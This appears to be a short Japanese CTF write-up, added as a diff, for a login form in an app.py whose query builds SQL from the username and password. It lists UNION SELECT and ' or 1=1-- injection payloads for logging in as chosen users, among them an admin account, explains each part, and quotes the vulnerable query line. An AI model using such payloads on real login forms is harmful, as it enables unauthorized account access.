@@ -1,0 +1,23 @@
+username: any
+password:
+
+' UNION SELECT 'alpaca', 1--
+' UNION SELECT 'reindeer', 1--
+' UNION SELECT 'santa_claus_admin', 1--
+
+#SQLの意味
+'で終わらす
+UNIONで結合
+SELECTでuser[0], user[1]を指定
+--でコメントアウト
+
+※ alpacaのみ、「' or 1=1--」　でも可。
+
+#プログラムで見るところ
+・app.py l.67
+#user = conn.execute(query).fetchone()
+SQL結果を1行だけ出力
+
+・app.py l.62
+#SELECT * FROM users WHERE username='{username}' AND password='{password}';
+
